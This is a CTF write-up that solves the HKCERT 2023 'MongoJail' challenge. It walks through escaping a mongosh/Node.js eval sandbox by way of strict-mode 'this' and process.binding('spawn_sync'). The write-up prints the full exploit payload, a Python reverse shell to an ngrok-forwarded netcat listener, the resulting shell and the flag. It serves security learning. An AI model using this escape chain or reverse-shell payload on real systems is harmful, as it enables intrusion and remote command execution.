# MongoJail

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 49 solves / 250 points
- Author: ozetta
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112204245.png)

Can you escape from Shibuya?

```bash
nc chal.hkcert23.pwnable.hk 28225
```

Attachment: [mongojail_29b79657d01916b2653c9388d76a53b9.zip](https://file.hkcert23.pwnable.hk/mongojail_29b79657d01916b2653c9388d76a53b9.zip)

**Note:** There is a guide for this challenge [here](https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c).

## Enumeration

**In this challenge, we can Netcat into the challenge instance:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|20:43:29(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225                              
Enter math expression:

```

Upon connecting, the server prompts me to enter a math expression.

Let's try to enter `7*7`:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|20:43:29(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225                              
Enter math expression:
7*7
49
```

Yep. It respond `49`.

**In this challenge, we can also download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/pwn/MongoJail/mongojail_29b79657d01916b2653c9388d76a53b9.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|20:45:47(HKT)]
└> file mongojail_29b79657d01916b2653c9388d76a53b9.zip 
mongojail_29b79657d01916b2653c9388d76a53b9.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|20:45:49(HKT)]
└> unzip mongojail_29b79657d01916b2653c9388d76a53b9.zip 
Archive:  mongojail_29b79657d01916b2653c9388d76a53b9.zip
   creating: chall/
 extracting: chall/proof.sh          
  inflating: chall/Dockerfile        
  inflating: chall/chall.py          
  inflating: docker-compose.yml      
```

**In `chall/Dockerfile`, we can see how the challenge instance's Docker container built:**
```bash
FROM mongo:7.0.2-jammy

RUN apt-get update && apt-get install -y python3 python3-venv socat
RUN python3 -m venv /home/ctfuser/venv

WORKDIR /home/ctfuser
COPY chall.py /home/ctfuser/
COPY proof.sh /
RUN mv /proof.sh /proof_$(head /dev/urandom | LC_ALL=C tr -dc A-Za-z0-9 | head -c 40).sh
RUN python3 -m compileall /home/ctfuser/
RUN chmod -R 555 /home/ctfuser/*
RUN chmod 555 /proof*.sh

USER mongodb
CMD socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 /home/ctfuser/venv/bin/python3 /home/ctfuser/chall.py"
```

First, it pulls the [MongoDB version 7.0.2 Docker image](https://hub.docker.com/layers/library/mongo/7.0.2-jammy/images/sha256-075e0577e2989efee25f8e6cd615ae1ce84da1f8c79adc3557aaf253dbf7a5e0?context=explore), install Python 3 and socat.

Then, copy `chall.py` and `proof.sh` to `/home/ctfuser/`.

Finally, using socat to setup a TCP listener on port 1337, and execute `python3 /home/ctfuser/chall.py` when someone connected to the listener.

**`chall.py`:**
```python
import subprocess

def main():
    print('Enter math expression:')
    script = input().replace('"','\\"').replace('\\','\\\\').replace("'","\\'")
    bad = "Object.keys(global).concat(module.constructor.builtinModules).concat(['require','module','globalThis']).filter((_)=>!/[@\\/-]/.test(_)).join(',')"
    jail = """'use strict';eval('(function('+%s+'){return eval("%s")})()')""" % (bad,script)
    proc = subprocess.Popen(["mongosh","--nodb","--quiet","--eval",jail], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print(proc.stdout.read().decode())

if __name__ == '__main__':
    try:
        main()
    except:
        print('Unknown Error ??') # contact admin if you see this in production
```

In the above Python code, it takes the user's input and sanitize it. Then, **it'll run `mongosh --nodb --quiet --eval <jail>`**.

In MongoDB Shell (`mongosh`), **the `--eval` option will evaluate a JavaScript expression**. That being said, **we can run the back-end version of JavaScript, Node.js**.

Let's take a look at the sanitize part!

First, it'll escape `"\'` character. This ensure that we can't escape the `eval("")`'s double quotes.

**Then, in `bad` variable, it concatenates all the built-in modules from the `global` object and some keywords like `require`, `module`, `globalThis`:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|21:20:56(HKT)]
└> nodejs                           
[...]
> Object.keys(global).concat(module.constructor.builtinModules).concat(['require','module','globalThis']).filter((_)=>!/[@\\/-]/.test(_)).join(',')
'global,queueMicrotask,clearImmediate,setImmediate,structuredClone,clearInterval,clearTimeout,setInterval,setTimeout,atob,btoa,performance,fetch,_http_agent,_http_client,_http_common,_http_incoming,_http_outgoing,_http_server,_stream_duplex,_stream_passthrough,_stream_readable,_stream_transform,_stream_wrap,_stream_writable,_tls_common,_tls_wrap,assert,async_hooks,buffer,child_process,cluster,console,constants,crypto,dgram,diagnostics_channel,dns,domain,events,fs,http,http2,https,inspector,module,net,os,path,perf_hooks,process,punycode,querystring,readline,repl,stream,string_decoder,sys,timers,tls,trace_events,tty,url,util,v8,vm,worker_threads,zlib,require,module,globalThis'
```

**Next, in `jail` variable, it looks like this:**
```javascript
'use strict';eval('(function('+<bad>+'){return eval("<script>")})()')
```

The `use strict` means all the JavaScript code can't use undeclared variables.

**It also makes all the built-in modules and keywords from `bad` variable to `undefined`. That being said, we can't use those:**
```javascript
> eval('(function('+Object.keys(global).concat(module.constructor.builtinModules).concat(['require','module','globalThis']).filter((_)=>!/[@\\/-]/.test(_)).join(',')+'){return eval("require")})()')
undefined
```

So... How can we escape this MongoDB Shell (or basically Node.js) jail...

Based on my experience, I knew that some CTFs have similar challenge, and it's called "Node.js VM sandbox escape". This [`vm` module](https://nodejs.org/api/vm.html) allows JavaScript being executed in a **sandbox** environment. However, **it's impossible to run code safely in a sandbox environment**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2023/images/Pasted%20image%2020231112214050.png)

Since I know very little about this kind of sandbox escape, I have to lookup some writeups.

Eventually, I found [this blog post](https://www.netspi.com/blog/technical/web-application-penetration-testing/escape-nodejs-sandboxes/) about escaping Node.js sandboxes.

**In that blog post, it mentioned that we can find a module via `process.binding`:**
```javascript
this.process.binding('<module_name>');
```

Wait... What's that `this` keyword??

> In non-strict mode, `this` is always a reference to an object. In strict mode, it can be any value. (from [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/this))

So `this` keyword is just referencing an object. In our case, it's referencing to the `global` object.

But hold up, it's different in strict mode:

> The value passed as `this` to a function in strict mode is not forced into being an object (a.k.a. "boxed"). For a sloppy mode function, `this` is always an object: either the provided object, if called with an object-valued `this`; or the boxed value of `this`, if called with a primitive as `this`; or the global object, if called with `undefined` or `null` as `this`. (Use [`call`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call), [`apply`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/apply), or [`bind`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind) to specify a particular `this`.) Not only is automatic boxing a performance cost, but exposing the global object in browsers is a security hazard because the global object provides access to functionality that "secure" JavaScript environments must restrict. Thus for a strict mode function, the specified `this` is not boxed into an object, and if unspecified, `this` is `undefined` instead of [`globalThis`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/globalThis) (from [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode))

**TL;DR: if `this` is used in strict mode, it should just return `undefined` instead of `globalThis` (non-strict mode `this`).**

Luckily, **the challenge didn't filter strict mode `this` keyword.**

## Exploitation

**With that said, we can use the `this` keyword to get the `global` object:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|22:04:56(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
this
{
  global: <ref *1> {
    global: [Circular *1],
    clearImmediate: [Function: clearImmediate],
    setImmediate: [Function: setImmediate] {
      [Symbol(nodejs.util.promisify.custom)]: [Getter]
    },
    clearInterval: [Function: clearInterval],
[...]
```

**Then, in the `global` object, we can get the `process` object, which is the current process (mongosh) object:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|22:09:57(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
this.process
process {
  version: 'v20.6.1',
  versions: {
    node: '20.6.1',
    acorn: '8.10.0',
[...]
```

**Next, in the `process` object, there's a `binding` function:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|22:10:06(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
this.process.binding
[Function: binding]
```

**Which allows us to find a module like `fs`:**
```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.12|22:10:37(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
this.process.binding('fs')
{
  access: [Function: access],
  close: [Function: close],
  open: [Function: open],
  openFileHandle: [Function: openFileHandle],
  read: [Function: read],
  readBuffers: [Function: readBuffers],
  fdatasync: [Function: fdatasync],
  fsync: [Function: fsync],
  rename: [Function: rename],
  ftruncate: [Function: ftruncate],
  rmdir: [Function: rmdir],
  mkdir: [Function: mkdir],
[...]
```

In the blog post that we've mentioned, we can execute system commands without `require` by using the rewrote version of `spawnSync` function in `child_process` module from [https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822](https://gist.github.com/CapacitorSet/c41ab55a54437dcbcb4e62713a195822).

**However, we need to make some changes:**
1. Change `process.binding()` to `this.process.binding()`
2. Remove `console.log()`

**Hence, the modified `spawnSync` function is:**
```javascript
spawn_sync = this.process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||this.process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}};var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
```

Finally, we can use the above modified `spawnSync` function to execute system commands.

To get a shell on the challenge instance, we can:

- Setup a netcat listener:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.11|13:53:30(HKT)]
└> nc -lnvp 4444                    
listening on [any] 4444 ...
```

- Port forwarding via Ngrok:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.11|13:53:20(HKT)]
└> ngrok tcp 4444                   
[...]
Forwarding                    tcp://0.tcp.ap.ngrok.io:11075 -> localhost:4444
```

By doing this, the challenge instance can reach to our netcat listener.

- Send the Python reverse shell payload using the modified `spawnSync` function:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.11|13:53:43(HKT)]
└> nc chal.hkcert23.pwnable.hk 28225
Enter math expression:
spawn_sync = this.process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||this.process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}};var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};spawnSync('python3',['-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ngrok_domain>",<your_ngrok_port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']);
```

> Note: Remeber to replace your own Ngrok domain and port number.

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/HKCERT-CTF-2023/pwn/MongoJail)-[2023.11.11|13:53:30(HKT)]
└> nc -lnvp 4444                    
listening on [any] 4444 ...
[...]
$ whoami;hostname;id
mongodb
chal25-mongojail-0
uid=999(mongodb) gid=999(mongodb) groups=999(mongodb)
```

Nice! I got a reverse shell on the challenge instance!

**Let's run the `proof.sh` script and get the flag!**
```shell
$ ls -lah /
[...]
-r-xr-xr-x    1 root root   70 Nov  5 14:39 proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh
[...]
$ sh /proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh
hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}
```

- **Flag: `hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}`**

## Conclusion

What we've learned:

1. MongoDB shell jail escape & filter bypass